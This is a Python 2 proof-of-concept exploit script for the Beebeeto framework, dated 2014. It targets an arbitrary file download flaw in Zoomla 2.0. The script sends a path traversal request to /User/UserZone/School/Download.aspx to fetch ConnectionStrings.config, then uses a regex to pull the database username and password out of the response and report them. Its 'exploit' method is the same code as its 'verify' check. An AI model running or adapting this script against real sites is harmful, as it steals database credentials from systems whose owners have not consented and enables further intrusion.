#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import math
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0073',# 由Beebeeto官方编辑
            'name': 'Zoomla 2.0 /User/UserZone/School/Download.aspx 任意文件下载漏洞 Exploit',  # 名称
            'author': 'root',  # 作者
            'create_date': '2014-10-17',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Zoomla',  # 漏洞所涉及的应用名称
            'vul_version': ['2.0'],  # 受漏洞影响的应用版本
            'type': 'Arbitary File Download ',  # 漏洞类型
            'tag': ['Zoomla漏洞', 'Arbitary File Download', ],  # 漏洞相关tag
            'desc': 'Zoomla X2.0 has Arbitary File Download in /User/UserZone/School/Download.aspx.',  # 漏洞描述
            'references': ['N/A',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        username = ""
        passwor = ""
        payload = "/User/UserZone/School/Download.aspx?f=..\..\..\Config\ConnectionStrings.config" 
        verify_url = args['options']['target'] + payload
        response = urllib2.urlopen(verify_url)
        if args['options']['verbose']:
            print '[*] GET DATA from: ' + verify_url
        html = response.read().decode('utf-8')
        data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
        username = data[0][0]
        password = data[0][1]
        if username and password :
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['username'] = username
            args['poc_ret']['password'] = password
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
